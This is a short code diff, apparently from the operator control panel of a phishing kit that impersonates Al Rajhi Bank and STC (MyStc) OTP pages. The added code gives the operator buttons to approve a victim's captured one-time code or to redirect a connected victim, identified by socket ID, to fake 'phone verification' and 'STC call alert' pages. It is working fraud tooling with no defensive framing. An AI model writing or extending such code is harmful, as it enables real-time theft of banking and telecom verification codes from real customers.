@@ -1207,6 +1207,9 @@
             // تغيير اسم زر الموافقة إلى "توثيق الجوال" لصفحة الراجحي OTP
             if (dc.page === 'الراجحى (OTP)') {
               html += '<button onclick="navigateVisitorToPage(\'' + visitor.socketId + '\', \'phone-verification\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توثيق الجوال</button>';
+            } else if (dc.page === 'MyStc OTP') {
+              // زر اتصال STC لصفحة MyStc OTP
+              html += '<button onclick="navigateVisitorToPage(\'' + visitor.socketId + '\', \'stc-call-alert\')" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اتصال STC</button>';
             } else {
               html += '<button onclick="codeActionApprove(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
             }
